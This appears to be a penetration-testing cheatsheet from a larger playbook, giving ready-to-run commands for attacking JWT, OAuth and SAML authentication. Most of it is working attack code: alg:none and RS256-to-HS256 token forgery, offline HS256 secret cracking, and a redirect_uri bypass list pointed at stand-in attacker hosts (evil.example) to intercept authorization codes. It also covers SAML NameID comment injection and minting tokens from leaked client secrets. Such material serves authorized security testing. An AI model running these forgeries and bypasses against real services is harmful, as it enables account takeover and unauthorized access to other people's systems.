# JWT + OAuth Cheatsheet: token dissection, forgery, OAuth flow attacks

Command set for playbook classes 3 and 4. Every forged or minted token gets replayed through the capture front door; the negative control (garbage signature) always runs in the same session. Pairs with the auth-gate matrix in http.md.

## 1. JWT dissection (always decode before theorizing)

```bash
python3 - <<'EOF'
import base64, json
tok = "<JWT>"
for i, part in enumerate(tok.split(".")[:2]):
    pad = part + "=" * (-len(part) % 4)
    print(f"--- segment {i} ---")
    print(json.dumps(json.loads(base64.urlsafe_b64decode(pad)), indent=1))
EOF
```

Read off: alg (none family; HS256 alongside an RSA public key = confusion candidate), exp/iat (missing exp = mint-and-replay proof), iss/aud (missing = cross-service replay candidate), sub/role/scope (forgery targets), jti (replay detection hints).

## 2. alg:none forgery family

```bash
python3 - <<'EOF'
import base64, json
def b64(s): return base64.urlsafe_b64encode(s).rstrip(b"=").decode()
h = b64(json.dumps({"alg": "none", "typ": "JWT"}).encode())
c = b64(json.dumps({"sub": "1", "role": "admin", "exp": 1893456000}).encode())
open("tok_none", "w").write(f"{h}.{c}.")
c2 = b64(json.dumps({"alg": "None"}).encode())
open("tok_None", "w").write(f"{c2}.{c}.")
EOF
curl -sv 'https://<TARGET>/api/v1/admin' -H "Authorization: Bearer $(cat tok_none)" 2>&1 | grep '< HTTP'
curl -sv 'https://<TARGET>/api/v1/admin' -H "Authorization: Bearer $(cat tok_None)" 2>&1 | grep '< HTTP'
```

Try the casing family (none/None/nOnE) against the auth gate. Rejection everywhere = modern library; move to section 3.

## 3. RS256 -> HS256 confusion (re-sign with the public PEM as HMAC secret)

```bash
python3 - <<'EOF'
import base64, json, hmac, hashlib
pub = open("cert.pem").read()                     # the RSA public key from the JWKS endpoint or the APK/JS corpus
def b64(s): return base64.urlsafe_b64encode(s).rstrip(b"=").decode()
h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
c = b64(json.dumps({"sub": "1", "role": "admin", "exp": 1893456000}).encode())
sig = b64(hmac.new(pub.encode(), f"{h}.{c}".encode(), hashlib.sha256).digest())
open("tok_hs", "w").write(f"{h}.{c}.{sig}")
EOF
curl -sv 'https://<TARGET>/api/v1/admin' -H "Authorization: Bearer $(cat tok_hs)" 2>&1 | grep '< HTTP'
```

## 4. HS256 secret cracking (wordlist, offline)

```bash
python3 - <<'EOF'
import hmac, hashlib, base64, json
tok = "<JWT>"
h, c, sig = tok.split(".")
msg = f"{h}.{c}".encode()
sig = base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))
for pw in open("wordlist.txt", errors="ignore"):
    pw = pw.strip()
    if hmac.new(pw.encode(), msg, hashlib.sha256).digest() == sig:
        print("SECRET:", pw)
        break
EOF
```

Cracked secret = forge arbitrary claims; the minted admin token replayed and accepted is the proof.

## 5. Cross-surface prefix matrix (one token family, four header shapes)

```bash
for shape in "$RAW" "bearer $RAW" "Bearer $RAW" "$STRIPPED"; do
  printf '%s -> ' "${shape:0:20}"
  curl -s -o /dev/null -w '%{http_code}\n' 'https://<TARGET>/api/v1/me' -H "Authorization: $shape"
done
```

Raw = the value as returned by login (some APIs return "bearer eyJ..." WITH the prefix inside the value); stripped = the bare JWT. A 302-with-empty-body usually means wrong prefix shape, not a dead token. Try all four on every surface before writing any verdict about the token.

## 6. OAuth redirect_uri ladder

```bash
CID="<CLIENT-ID>"; R="https://<TARGET>/oauth/authorize"
for u in \
  "https://callback.evil.example" \
  "https://<TARGET>.evil.example" \
  "https://evil.example/<TARGET>.com" \
  "https://<TARGET>.com.evil.example" \
  "https://<TARGET>/callback/../../redirect?url=https://evil.example" \
  "https://<TARGET>/callback#@evil.example" \
  "https://<TARGET>/redirect?url=https://evil.example"; do
  printf '%s -> ' "$u"
  curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' "$R?client_id=$CID&redirect_uri=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")&response_type=code&state=x"
done
# parameter pollution: duplicate redirect_uri, first vs last wins
curl -sv "$R?client_id=$CID&redirect_uri=https://<TARGET>/cb&redirect_uri=https://evil.example&response_type=code" 2>&1 | grep -iE '< HTTP|< location'
```

Location pointing at (or transiting to) attacker-controlled origin = code-interception lead; complete it with the state/postMessage analysis (section 7) and the token mint on the code.

## 7. state + code handling probes

```bash
# state missing (CSRF into session linking): fire twice, compare
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' "$R?client_id=$CID&redirect_uri=https://<TARGET>/cb&response_type=code"
# code single-use check (replay the same code):
curl -sv -X POST 'https://<TARGET>/oauth/token' -d 'grant_type=authorization_code&code=<CAPTURED-CODE>&client_id=<CID>' 2>&1 | grep -E '< HTTP|error'
curl -sv -X POST 'https://<TARGET>/oauth/token' -d 'grant_type=authorization_code&code=<CAPTURED-CODE>&client_id=<CID>' 2>&1 | grep -E '< HTTP|error'
# postMessage origin audit on the callback page (from the JS corpus):
grep -rn "addEventListener('message'" js/ | head; grep -rn 'e.origin' js/callback*.js | head
```

## 8. SAML quick probes (where present)

```bash
# XSW smoke: wrap the assertion with an attacker-controlled NameID inside the envelope
python3 decode_assertion.py 'base64:<SAMLResponse-from-capture>'   # verify the original parses
# comment injection into NameID (post-back through the SP):
python3 - <<'EOF'
import base64
nid = "victim@example.com<!--comment-->@attacker.example"
print(base64.b64encode(f"<NameID>{nid}</NameID>".encode()).decode())
EOF
```

The SP accepting the wrapped or injected assertion with attacker-chosen identity = the takeover proof on an owned test account.

## 9. Token mint via leaked client pairs (class 1 -> class 3 chain)

```bash
# basic pair from the APK/JS corpus:
PAIR=$(echo -n "<CLIENT>:<SECRET>" | base64)
curl -sv -X POST 'https://<TARGET>/oauth/token' \
  -H "Authorization: Basic $PAIR" -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'grant_type=client_credentials' 2>&1 | grep -E '< HTTP|access_token'
# marker-bound mints: grep the decompiled corpus for request constructors with literal URL markers
grep -rn 'new ReqAccessToken' decoded/jadx-out/ | grep '"/' | head -20
# then matrix mint-marker x endpoint (each marker is a scoped capability)
```

## 10. Session checks

```bash
# logout server-side or not: reuse the session after logout
curl -sv -X POST 'https://<TARGET>/api/v1/logout' -H 'Authorization: Bearer <TOKEN>' 2>&1 | grep '< HTTP'
curl -s -o /dev/null -w '%{http_code}\n' 'https://<TARGET>/api/v1/me' -H 'Authorization: Bearer <TOKEN>'
# cookie flags
curl -sv 'https://<TARGET>/login' 2>&1 | grep -i 'set-cookie'
# want: HttpOnly; Secure; SameSite. Absent flags are chain material, note them.
```
